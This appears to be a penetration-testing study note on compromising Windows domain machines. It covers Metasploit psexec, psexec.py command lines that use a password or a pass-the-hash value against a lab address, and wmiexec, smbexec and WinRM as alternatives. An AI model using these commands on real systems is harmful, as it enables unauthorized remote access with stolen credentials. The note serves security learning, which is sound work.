**More often than not, you can compromise a domain WITHOUT gaining access to a shell**
  
Through metasploit - with a password
- use exploit/windows/smb/psexec
![Untitled 15.png](/Untitled%2015.png)
Through metasploit - with a hash
- use exploit/windows/smb/psexec as well (just put the hash in for SMBPass instead of a password)
  
psexec.py - with a password
- “psexec.py marvel.local/fcastle:’Password1’@10.0.0.25”
    
    - marvel.local is the domain
    
    - fcastle is the user
    
    - ‘Password1’ is the password
    
  
psexec.py - with a hash
- “psexec.py administrator@10.0.0.25 -hashes <hash>
    
    - gives shell access using a hash
    
    - means we do not NEED to crack a hash to get into a Windows machine
    
- if psexec.py doesn’t work, try wmiexec.py or smbexec.py
    
    - all function the same way
    
  
Port 5985 - WinRM
- need credentials
[https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)
  
[[Dcomexec]]